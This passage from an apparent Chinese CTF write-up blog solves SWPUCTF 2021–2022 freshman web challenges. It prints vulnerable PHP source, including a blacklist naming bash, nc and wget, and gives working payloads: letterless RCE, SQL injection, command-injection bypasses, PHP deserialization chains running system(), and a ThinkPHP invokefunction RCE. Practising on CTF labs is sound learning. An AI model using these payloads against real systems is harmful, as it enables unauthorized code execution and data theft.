<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>]))
{
    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>];
    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">' '</span>,<span class="hljs-string">'\t'</span>,<span class="hljs-string">'\r'</span>,<span class="hljs-string">'\n'</span>,<span class="hljs-string">'\+'</span>,<span class="hljs-string">'\['</span>,<span class="hljs-string">'\^'</span>,<span class="hljs-string">'\]'</span>,<span class="hljs-string">'\"'</span>,<span class="hljs-string">'\-'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\*'</span>,<span class="hljs-string">'\?'</span>,<span class="hljs-string">'\&lt;'</span>,<span class="hljs-string">'\&gt;'</span>,<span class="hljs-string">'\='</span>,<span class="hljs-string">'\`'</span>,];
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">'/m'</span>, <span class="hljs-variable">$wllm</span>)) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"LTLT说不能用这些奇奇怪怪的符号哦！"</span>);
    }}
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[a-zA-Z]/is'</span>,<span class="hljs-variable">$wllm</span>))
{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Ra's Al Ghul说不能用字母哦！"</span>);
}
<span class="hljs-keyword">echo</span> <span class="hljs-string">"NoVic4说：不错哦小伙子，可你能拿到flag吗？"</span>;
<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"蔡总说：注意审题！！！"</span>;
}
<span class="hljs-meta">?&gt;</span> 蔡总说：注意审题！！！</code></pre>
<p>可以看到字母和大部分符号都过滤了，只能无字母RCE。可参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//在命令行中运行</span>

<span class="hljs-comment">/*author yu22x*/</span>

<span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">'[+]your function: '</span>);

<span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\r\n"</span>, <span class="hljs-string">"\r"</span>, <span class="hljs-string">"\n"</span>), <span class="hljs-string">""</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));

<span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">'[+]your command: '</span>);

<span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\r\n"</span>, <span class="hljs-string">"\r"</span>, <span class="hljs-string">"\n"</span>), <span class="hljs-string">""</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));

<span class="hljs-keyword">echo</span> <span class="hljs-string">'[*] (~'</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">')(~'</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">');'</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194201575.png" alt="image-20240303194201575"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194218237.png" alt="image-20240303194218237"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194242292.png" alt="image-20240303194242292"></p>
<h1 id="swpuctf-2021-新生赛error">[SWPUCTF 2021 新生赛]error</h1>
<p>简单的报错注入</p>
<pre><code class="hljs scss">?id=<span class="hljs-number">1</span>' and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,substr((select flag from test_tb),<span class="hljs-number">15</span>,<span class="hljs-number">30</span>)),<span class="hljs-number">1</span>)--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303195140537.png" alt="image-20240303195140537"></p>
<h1 id="swpuctf-2021-新生赛pop">[SWPUCTF 2021 新生赛]pop</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">"index.php"</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>{

    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">'aaa'</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">'123456'</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">'w44m'</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">'08067'</span>){
            <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;
            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'nono'</span>;
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;{<span class="hljs-variable language_">$this</span>-&gt;w22m}();
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}

<span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'w00m'</span>];
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">'w44m'</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">'08067'</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;
}
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();
<span class="hljs-variable">$pop</span>-&gt;w00m = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();
<span class="hljs-variable">$pop</span>-&gt;w00m-&gt;w00m = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();
<span class="hljs-variable">$pop</span>-&gt;w00m-&gt;w22m = <span class="hljs-string">'Getflag'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303200129685.png" alt="image-20240303200129685"></p>
<p>注意不可见字符的处理即可</p>
<h1 id="swpuctf-2021-新生赛sql">[SWPUCTF 2021 新生赛]sql</h1>
<p>这道题过滤了几个关键字</p>
<pre><code class="hljs scss">空格用<span class="hljs-comment">/**/</span>代替
=用like代替
--+中的+用%<span class="hljs-number">23</span>代替
substr用mid代替</code></pre>
<pre><code class="hljs scss">wllm=-<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">mid</span>((concat(flag)),<span class="hljs-number">25</span>,<span class="hljs-number">35</span>),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>LTLT_flag%<span class="hljs-number">23</span></code></pre>
<h1 id="swpuctf-2021-新生赛finalrce">[SWPUCTF 2021 新生赛]finalrce</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>]))
{
    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>];
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\&gt;|\&lt;|\%|\$/i'</span>,<span class="hljs-variable">$url</span>))
    {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Sorry,you can't use this."</span>;
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Can you see anything?"</span>;
        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);
    }
}</code></pre>
<p>由于exec函数，那么是无回显的，这里可以用tee命令将内容重定向到文件，随后查看文件即可</p>
<pre><code class="hljs scss">l\s /|tee <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303203715901.png" alt="image-20240303203715901"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204310579.png" alt="image-20240303204310579"></p>
<pre><code class="hljs scss">?url=tac /flllll\aaaaaaggggggg |tee <span class="hljs-number">3</span><span class="hljs-selector-class">.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204338590.png" alt="image-20240303204338590"></p>
<h1 id="swpuctf-2022-新生赛ez_ez_php">[SWPUCTF 2022 新生赛]ez_ez_php</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {
    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">"php"</span> ) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Nice!!!"</span>;
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>]);
    } 

    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!!"</span>;
    }
}<span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-comment">//flag.php</span></code></pre>
<p>根据代码，很明显要求我们用PHP伪协议（这么明显？？）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204811480.png" alt="image-20240303204811480"></p>
<p>然后提示flag在flag文件中</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204821994.png" alt="image-20240303204821994"></p>
<h1 id="swpuctf-2022-新生赛ez_ez_phprevenge">[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {
    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">"php"</span> ) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Nice!!!"</span>;
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>]);
    } 

    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!!"</span>;
    }
}<span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-comment">//flag.php</span></code></pre>
<p>不理解，一模一样，只不过flag换地方了。。。？？？？</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303205018625.png" alt="image-20240303205018625"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303205030022.png" alt="image-20240303205030022"></p>
<h1 id="swpuctf-2022-新生赛奇妙的md5">[SWPUCTF 2022 新生赛]奇妙的MD5</h1>
<p>这道题听脑洞，不会-》看wp</p>
<p>首先是信息搜集，发现http头有提示</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210123025.png" alt="image-20240303210123025"></p>
<p>也就是说大概率传一个字符，经过<code>md5($pass, true)</code>处理之后与前面的SQL语句拼接之后恒为true</p>
<p>这里我想不出来，看了wp发现有两种可能</p>
<pre><code class="hljs scss">一个算是万能绕过的字符：ffifdyop，根据函数md5加密后，再次转换为字符串时，会变成’or’<span class="hljs-number">6</span>，此时函数一定为真。（具体内容可以查一查<span class="hljs-built_in">md5</span>($pass,true)函数）

一个是 MD5 加密后弱比较等于自身，这个字符串是 <span class="hljs-number">0</span>e215962017</code></pre>
<p><code>md5($pass, true)</code> 的含义是对 <code>$pass</code> 进行 MD5 哈希计算，其中第二个参数为 <code>true</code>，表示返回二进制结果，而不是十六进制字符串。通常情况下，MD5 哈希函数返回的是一个32个字符的十六进制字符串表示的哈希值，但如果传入 <code>true</code> 参数，则返回一个16字节的二进制字符串。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210303084.png" alt="image-20240303210303084"></p>
<p>输入上述的字符串ffifdyop之后，到了第二个页面，找到部分源码</p>
<pre><code class="hljs scss">&lt;!--
<span class="hljs-variable">$x</span>= <span class="hljs-variable">$GET</span><span class="hljs-selector-attr">[<span class="hljs-string">'x'</span>]</span>;
<span class="hljs-variable">$y</span> = $_GET<span class="hljs-selector-attr">[<span class="hljs-string">'y'</span>]</span>;
<span class="hljs-built_in">if</span>($x != $y &amp;&amp; md5($x) == <span class="hljs-built_in">md5</span>($y)){
    ;
-&gt;</code></pre>
<p>数组绕过，之后到第三个页面，依旧是数组绕过</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;

<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'wqh'</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'dsy'</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'wqh'</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'dsy'</span>])){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;
}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210521940.png" alt="image-20240303210521940"></p>
<h1 id="swpuctf-2022-新生赛1z_unserialize">[SWPUCTF 2022 新生赛]1z_unserialize</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lyh</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span> = <span class="hljs-string">'NSSCTF.com'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lt</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lly</span>;
     
     <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">     </span>{
        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;lt;

        <span class="hljs-variable">$a</span>(<span class="hljs-variable language_">$this</span>-&gt;lly);
     }
    
    
}
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'nss'</span>]);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>简单的反序列化</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lyh</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lt</span> = <span class="hljs-string">'system'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lly</span> = <span class="hljs-string">'cat${IFS}/flag'</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;lt;
        <span class="hljs-variable">$a</span>(<span class="hljs-variable language_">$this</span>-&gt;lly);
    }
}
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lyh</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-meta">?&gt;</span>
    <span class="hljs-comment">//O:3:"lyh":3:{s:3:"url";N;s:2:"lt";s:6:"system";s:3:"lly";s:14:"cat${IFS}/flag";}</span></code></pre>
<h1 id="swpuctf-2022-新生赛ez_rce">[SWPUCTF 2022 新生赛]ez_rce</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309153637104.png" alt="image-20240309153637104"></p>
<p>直接robots.txt找到对应路由，访问之后发现是thinkphp漏洞，直接payload打就行了</p>
<pre><code class="hljs scss">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars<span class="hljs-selector-attr">[0]</span>=system&amp;vars<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[]</span>=cat /nss/ctf/flag/flag</code></pre>
<h1 id="swpuctf-2022-新生赛ez_ez_unserialize">[SWPUCTF 2022 新生赛]ez_ez_unserialize</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span> = <span class="hljs-keyword">__FILE__</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-variable">$x</span>;
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;x !== <span class="hljs-keyword">__FILE__</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-keyword">__FILE__</span>;
        }
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;x);
        <span class="hljs-comment">//flag is in fllllllag.php</span>
    }
}
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'x'</span>])) {
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'x'</span>]);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}</code></pre>
<p>简单的链子，绕过wakeup即可</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span> = <span class="hljs-string">'fllllllag.php'</span>;
}
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">X</span>();
